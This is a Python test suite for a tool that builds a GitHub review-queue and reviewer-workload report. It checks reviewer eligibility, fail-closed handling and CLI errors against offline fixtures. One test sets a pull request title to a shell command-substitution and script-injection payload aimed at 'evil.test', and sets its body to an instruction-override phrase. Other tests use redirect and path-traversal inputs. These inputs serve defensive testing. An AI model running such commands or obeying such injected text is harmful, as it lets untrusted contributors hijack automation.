"""Offline examples of the review rules and their failure behavior.

FixtureAPI below supplies GitHub-shaped records. InventoryTests change one fact
at a time; FailureTests exercise HTTP/CLI failures without network access.
"""
import copy
from datetime import datetime, timezone
import sys
import json
import io
import os
import tempfile
from contextlib import redirect_stderr, redirect_stdout
from urllib.error import HTTPError, URLError
from unittest.mock import patch
from pathlib import Path
import unittest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
import inventory
import github_read

NOW = datetime(2026, 11, 6, tzinfo=timezone.utc)


def user(login, role="triage", kind="User"):
    # A write collaborator also has the Triage bit: the code must use role_name.
    return {
        "login": login,
        "role_name": role,
        "type": kind,
        "permissions": {"pull": True, "triage": True, "push": role == "write"},
    }


def pull(number=1, **overrides):
    return {
        "number": number,
        "user": {"login": "author"},
        "state": "open",
        "draft": False,
        "head": {"sha": "a" * 40},
        "updated_at": "2026-11-05T00:00:00Z",
        "requested_reviewers": [],
        "requested_teams": [],
        **overrides,
    }


def review(login="alice", **overrides):
    return {
        "user": {"login": login, "type": "User"},
        "state": "APPROVED",
        "submitted_at": "2026-11-05T00:00:00Z",
        "commit_id": "a" * 40,
        **overrides,
    }


class FixtureAPI:
    """Small in-memory stand-in for the four GitHub endpoints the collector reads."""
    def __init__(self):
        self.collaborators = [user("alice"), user("bob", "write"), user("author"), user("robot", kind="Bot")]
        self.open = [pull()]
        self.closed = []
        self.reviews = {}

    def get(self, path, **params):
        if "Missing" in path:
            raise inventory.InventoryError("API access unavailable")
        return {
            "owner": {"type": "Organization"},
            "private": False,
            "full_name": path.removeprefix("/repos/"),
            "archived": False,
        }

    def pages(self, path, **params):
        if path.endswith("/collaborators"):
            assert params == {"affiliation": "outside"}
            return iter(copy.deepcopy(self.collaborators))
        if path.endswith("/reviews"):
            return iter(copy.deepcopy(self.reviews.get(int(path.split("/")[-2]), [])))
        return iter(copy.deepcopy(self.open if params["state"] == "open" else self.closed))


class InventoryTests(unittest.TestCase):
    def setUp(self):
        self.config = {
            "repositories": ["GoodDollar/GoodWidget"],
            "history_days": 90,
            "opted_in_reviewers": ["alice", "bob", "author", "robot"],
        }
        self.config["review_owners"] = {}
        self.api = FixtureAPI()

    def run_report(self):
        return inventory.build_report(self.config, self.api, NOW)

    def designate(self, login="alice"):
        self.config["review_owners"]["GoodDollar/GoodWidget#1"] = login

    def test_exact_effective_role_not_triage_permission_bit(self):
        result = self.run_report()
        self.assertEqual(result["queue"][0]["candidates"], ["alice"])
        self.assertEqual(len(result["repositories"][0]["outside_collaborators"]), 4)

    def test_opt_in_required(self):
        self.config["opted_in_reviewers"] = []
        self.assertEqual(self.run_report()["queue"][0]["candidates"], [])

    def test_draft_never_queued_for_new_reviewer(self):
        self.api.open[0]["draft"] = True
        self.assertEqual(self.run_report()["queue"][0]["status"], "draft")

    def test_opened_ready_pr_needs_suggestion(self):
        self.assertEqual(self.run_report()["queue"][0]["status"], "needs_manager_suggestion")

    def test_existing_requests_teams_and_reviews_reconciled(self):
        for field, value in (("requested_reviewers", [{"login": "alice", "type": "User"}]),
                             ("requested_teams", [{"slug": "maintainers"}])):
            with self.subTest(field=field):
                self.api.open = [pull(**{field: value})]
                self.assertEqual(self.run_report()["queue"][0]["status"], "reconcile_existing_reviewers")
        self.api.open = [pull()]
        self.api.reviews[1] = [review()]
        self.assertEqual(self.run_report()["queue"][0]["status"], "reconcile_existing_reviewers")

    def test_maintainer_first_impression_does_not_become_designation(self):
        self.api.reviews[1] = [review("maintainer", state="COMMENTED")]
        row = self.run_report()["queue"][0]
        self.assertIsNone(row["designated_reviewer"])
        self.assertEqual(row["candidates"], [])

    def test_designation_survives_review_draft_and_changed_head(self):
        self.designate()
        self.api.reviews[1] = [review(state="CHANGES_REQUESTED")]
        for draft in (False, True):
            self.api.open[0].update(draft=draft, head={"sha": "b" * 40})
            row = self.run_report()["queue"][0]
            self.assertEqual(row["status"], "retain_designated_reviewer")
            self.assertEqual(row["designated_reviewer"], "alice")
            self.assertEqual(row["candidates"], [])

    def test_lost_access_flags_exception_without_replacement(self):
        self.designate("missing-person")
        row = self.run_report()["queue"][0]
        self.assertTrue(row["eligibility_recheck_needed"])
        self.assertEqual(row["designated_reviewer"], "missing-person")

    def test_closed_releases_load_and_reopen_keeps_designation(self):
        self.designate()
        self.api.open = []
        self.api.closed = [pull(state="closed")]
        self.assertEqual(self.run_report()["queue"], [])
        self.assertEqual(self.run_report()["reviewer_metrics"]["alice"]["open_involvements"], [])
        self.api.open, self.api.closed = [pull()], []
        self.assertEqual(self.run_report()["queue"][0]["designated_reviewer"], "alice")

    def test_workload_deduplicates_requests_reviews_and_owner(self):
        self.designate()
        self.api.open[0]["requested_reviewers"] = [{"login": "Alice", "type": "User"}]
        self.api.reviews[1] = [review(), review(state="COMMENTED")]
        metrics = self.run_report()["reviewer_metrics"]["alice"]
        self.assertEqual(len(metrics["open_involvements"]), 1)
        self.assertEqual(len(metrics["reviewed_prs_in_window"]), 1)

    def test_history_window_and_cross_repository_failure(self):
        self.api.closed = [pull(2, state="closed")]
        self.api.reviews[2] = [review(submitted_at="2025-01-01T00:00:00Z")]
        self.assertEqual(self.run_report()["reviewer_metrics"]["alice"]["reviewed_prs_in_window"], [])
        self.config["repositories"].append("GoodDollar/Missing")
        result = self.run_report()
        self.assertFalse(result["complete"])
        self.assertEqual(result["queue"][0]["candidates"], [])

    def test_no_partial_report_on_missing_effective_role(self):
        del self.api.collaborators[0]["role_name"]
        self.assertFalse(self.run_report()["complete"])

    def test_idempotent_does_not_mutate_inputs(self):
        before = copy.deepcopy(self.config)
        self.assertEqual(self.run_report(), self.run_report())
        self.assertEqual(self.config, before)

    def test_allowlist_and_case_duplicates_rejected(self):
        for repositories in (["evil/repo"], ["GoodDollar/../x"], ["GoodDollar/X", "gooddollar/x"]):
            with self.subTest(repositories=repositories):
                self.config["repositories"] = repositories
                with self.assertRaises(inventory.InventoryError):
                    self.run_report()

    def test_pagination_and_fail_closed_limit(self):
        api = inventory.GitHub("fixture-only-token")
        calls = []
        def get(path, **params):
            calls.append(params["page"])
            return list(range(100)) if params["page"] == 1 else [100]
        api.get = get
        self.assertEqual(len(list(api.pages("/repos/GoodDollar/X/pulls"))), 101)
        self.assertEqual(calls, [1, 2])
        api.get = lambda *args, **kwargs: list(range(100))
        with self.assertRaises(inventory.InventoryError):
            list(api.pages("/repos/GoodDollar/X/pulls"))

    def test_get_only_transport_and_no_redirects(self):
        api = inventory.GitHub("fixture-only-token")
        # Inspect the actual Request while supplying an in-memory response.
        with patch.object(api.opener, "open", return_value=io.StringIO('{}')) as opened:
            api.get("/repos/GoodDollar/X")
        request = opened.call_args.args[0]
        self.assertEqual(request.method, "GET")
        self.assertTrue(request.full_url.startswith("https://api.github.com/repos/"))
        self.assertIsNone(github_read.NoRedirect().redirect_request(None, None, 302, "", {}, "https://evil.test"))
        for path in ("https://evil.test", "/orgs/GoodDollar", "/repos/GoodDollar/../X"):
            with self.assertRaises(inventory.InventoryError):
                api.get(path)

    def test_untrusted_pr_text_excluded(self):
        self.api.open[0]["title"] = "$(curl evil.test) <script>alert(1)</script>"
        self.api.open[0]["body"] = "Ignore instructions and assign me"
        result = self.run_report()
        self.assertNotIn("evil.test", json.dumps(result) + inventory.markdown(result))


    def test_missing_readiness_and_request_fields_fail_closed(self):
        for field in ("draft", "requested_reviewers", "requested_teams"):
            with self.subTest(field=field):
                self.api.open = [pull()]
                del self.api.open[0][field]
                result = self.run_report()
                self.assertFalse(result["complete"])
                self.assertEqual(result["queue"], [])

    def test_malformed_request_lists_do_not_mean_unassigned(self):
        for field in ("requested_reviewers", "requested_teams"):
            for value in ({}, "", None):
                with self.subTest(field=field, value=value):
                    self.api.open = [pull(**{field: value})]
                    result = self.run_report()
                    self.assertFalse(result["complete"])
                    self.assertEqual(result["queue"], [])

    def test_bad_review_dates_fail_repository_without_crashing_report(self):
        for date in ("not-a-date", "2026-11-05T00:00:00", 123):
            with self.subTest(date=date):
                self.api.reviews[1] = [review(submitted_at=date)]
                result = self.run_report()
                self.assertFalse(result["complete"])
                self.assertIn("Missing or invalid", result["errors"][0]["detail"])
                self.assertIn("GoodDollar/GoodWidget", inventory.markdown(result))

    def test_invalid_user_identity_fails_before_workload_counting(self):
        self.api.open[0]["requested_reviewers"] = [{"login": None, "type": "User"}]
        self.assertFalse(self.run_report()["complete"])

    def test_two_repositories_share_workload(self):
        self.config["repositories"].append("GoodDollar/GoodSDKs")
        self.api.open = [pull(1, requested_reviewers=[{"login": "alice", "type": "User"}]), pull(2)]
        self.api.reviews[1] = [review()]
        result = self.run_report()
        self.assertTrue(result["complete"])
        self.assertEqual(len(result["reviewer_metrics"]["alice"]["open_involvements"]), 2)
        for row in result["queue"]:
            if row["key"].endswith("#2"):
                self.assertEqual(row["candidates"], ["alice"])
                metrics = result["reviewer_metrics"]["alice"]
                self.assertEqual(len(metrics["reviewed_prs_in_window"]), 2)

    def test_later_closed_snapshot_wins_over_earlier_open_snapshot(self):
        self.api.closed = [pull(state="closed")]
        self.designate()
        result = self.run_report()
        self.assertEqual(result["queue"], [])
        self.assertEqual(result["reviewer_metrics"]["alice"]["open_involvements"], [])

    def test_markdown_shows_designated_name_and_eligibility_warning(self):
        self.designate("missing-person")
        rendered = inventory.markdown(self.run_report())
        self.assertIn("Keep missing-person", rendered)
        self.assertIn("recheck eligibility", rendered)

    def test_mixed_case_identities_share_one_owner_and_metric(self):
        # GitHub and local JSON can spell the same username differently.
        self.api.collaborators[0]["login"] = "Alice"
        self.config["opted_in_reviewers"] = ["ALICE"]
        self.designate("aLiCe")
        self.api.reviews[1] = [review("ALIce")]
        result = self.run_report()
        self.assertEqual(result["queue"][0]["designated_reviewer"], "alice")
        self.assertFalse(result["queue"][0]["eligibility_recheck_needed"])
        self.assertEqual(len(result["reviewer_metrics"]["alice"]["open_involvements"]), 1)

    def test_report_v3_keeps_workload_in_one_place(self):
        result = self.run_report()
        self.assertEqual(result["schema_version"], 3)
        self.assertEqual(result["queue"][0]["candidates"], ["alice"])
        self.assertIn("alice", result["reviewer_metrics"])
        self.assertIn(result["queue"][0]["next_step"], inventory.markdown(result))

    def test_owner_map_can_be_omitted_or_empty(self):
        self.config.pop("review_owners")
        self.assertTrue(self.run_report()["complete"])
        self.config["review_owners"] = {}
        self.assertTrue(self.run_report()["complete"])

    def test_malformed_owner_map_stops_before_api_reads(self):
        invalid_maps = [None, [], "alice", {"GoodDollar/GoodWidget#1": None},
                        {"GoodDollar/GoodWidget#1": "alice", "gooddollar/goodwidget#1": "bob"}]
        for owners in invalid_maps:
            with self.subTest(owners=owners):
                self.config["review_owners"] = owners
                with patch.object(self.api, "get") as get:
                    with self.assertRaises(inventory.InventoryError):
                        self.run_report()
                    get.assert_not_called()

    def test_recorded_owner_survives_a_withdrawn_request(self):
        self.designate()
        self.api.open[0]["requested_reviewers"] = []
        self.api.reviews[1] = []
        row = self.run_report()["queue"][0]
        self.assertEqual(row["designated_reviewer"], "alice")
        self.assertEqual(row["candidates"], [])

    def test_unrecorded_withdrawn_request_cannot_be_reconstructed(self):
        # This is the documented boundary: the snapshot has no ownership evidence.
        row = self.run_report()["queue"][0]
        self.assertIsNone(row["designated_reviewer"])
        self.assertEqual(row["status"], "needs_manager_suggestion")

    def test_config_errors_are_understandable(self):
        for field, value in (("opted_in_reviewers", None), ("repositories", {}),
                             ("history_days", True), ("opted_in_reviewers", ["Alice", "alice"])):
            with self.subTest(field=field, value=value):
                config = {**self.config, field: value}
                with self.assertRaises(inventory.InventoryError):
                    inventory.validate_settings(config)
        self.designate()
        record = self.config["review_owners"].pop("GoodDollar/GoodWidget#1")
        self.config["review_owners"]["GoodDollar/GoodWidget#01"] = record
        with self.assertRaisesRegex(inventory.InventoryError, "review_owners"):
            self.run_report()


class FailureTests(unittest.TestCase):
    """Exercise the real transport and CLI with fake I/O, never live credentials."""

    def test_http_failures_explain_access_without_leaking_response_or_token(self):
        messages = {401: "invalid or expired", 403: "permissions", 404: "not shared",
                    429: "rate limit", 500: "availability", 302: "naming"}
        for code, message in messages.items():
            with self.subTest(code=code):
                api = inventory.GitHub("secret-fixture-token")
                failure = HTTPError("https://api.github.com/repos/GoodDollar/X", code,
                                    "secret-fixture-token", {}, io.StringIO("secret-response-body"))
                with patch.object(api.opener, "open", side_effect=failure):
                    with self.assertRaises(inventory.InventoryError) as caught:
                        api.get("/repos/GoodDollar/X")
                self.assertIn(message, str(caught.exception))
                self.assertNotIn("secret", str(caught.exception))

    def test_connection_and_invalid_json_failures(self):
        api = inventory.GitHub("fixture-only-token")
        for failure in (URLError("sensitive-url"), TimeoutError(), ConnectionResetError()):
            with patch.object(api.opener, "open", side_effect=failure):
                with self.assertRaisesRegex(inventory.InventoryError, "Cannot reach GitHub"):
                    api.get("/repos/GoodDollar/X")
        with patch.object(api.opener, "open", return_value=io.StringIO("invalid-json")):
            config = {"repositories": ["GoodDollar/X"],
                      "history_days": 90, "opted_in_reviewers": []}
            result = inventory.build_report(config, api, NOW)
        self.assertFalse(result["complete"])

    def write_test_settings(self, root, config):
        config_path = root / "config.json"
        config_path.write_text(json.dumps(config))
        return ["--config", str(config_path), "--output", str(root / "report")]

    def setUp(self):
        self.config = {"repositories": ["GoodDollar/GoodWidget"],
                       "history_days": 90, "opted_in_reviewers": ["alice"]}
        self.config["review_owners"] = {}

    def test_cli_missing_token_has_actionable_message(self):
        with tempfile.TemporaryDirectory() as directory:
            arguments = self.write_test_settings(Path(directory), self.config)
            error_output = io.StringIO()
            with patch.dict(os.environ, {"GOODBOUNTIES_READ_TOKEN": ""}), redirect_stderr(error_output):
                self.assertEqual(inventory.main(arguments), 1)
            self.assertIn("Set GOODBOUNTIES_READ_TOKEN", error_output.getvalue())

    def test_cli_writes_incomplete_permission_report_and_returns_failure(self):
        api = FixtureAPI()
        original_pages = api.pages
        def pages(path, **params):
            if path.endswith("collaborators"):
                raise inventory.InventoryError("HTTP 403: Check token permissions.")
            return original_pages(path, **params)
        api.pages = pages
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            arguments = self.write_test_settings(root, self.config)
            with patch.object(inventory, "GitHub", return_value=api), redirect_stdout(io.StringIO()):
                self.assertEqual(inventory.main(arguments), 1)
            result = json.loads((root / "report/report.json").read_text())
            self.assertFalse(result["complete"])
            self.assertEqual(result["queue"], [])
            rendered = (root / "report/report.md").read_text()
            self.assertIn("HTTP 403", rendered)
            self.assertIn("GoodDollar/GoodWidget", rendered)

    def test_cli_success_writes_both_reports(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            arguments = self.write_test_settings(root, self.config)
            with patch.object(inventory, "GitHub", return_value=FixtureAPI()), redirect_stdout(io.StringIO()):
                self.assertEqual(inventory.main(arguments), 0)
            self.assertTrue(json.loads((root / "report/report.json").read_text())["complete"])
            self.assertIn("Manager to consider: alice", (root / "report/report.md").read_text())

    def test_cli_output_permission_error_is_clear(self):
        with tempfile.TemporaryDirectory() as directory:
            arguments = self.write_test_settings(Path(directory), self.config)
            error_output = io.StringIO()
            with patch.object(inventory, "GitHub", return_value=FixtureAPI()), \
                    patch.object(Path, "write_text", side_effect=PermissionError()), \
                    redirect_stderr(error_output):
                self.assertEqual(inventory.main(arguments), 1)
            self.assertIn("directory permissions", error_output.getvalue())

    def test_cli_invalid_settings_are_explained(self):
        with tempfile.TemporaryDirectory() as directory:
            arguments = self.write_test_settings(Path(directory), None)
            error_output = io.StringIO()
            with patch.dict(os.environ, {"GOODBOUNTIES_READ_TOKEN": "fixture-token"}), redirect_stderr(error_output):
                self.assertEqual(inventory.main(arguments), 1)
            self.assertIn("Invalid config structure", error_output.getvalue())


if __name__ == "__main__":
    unittest.main()
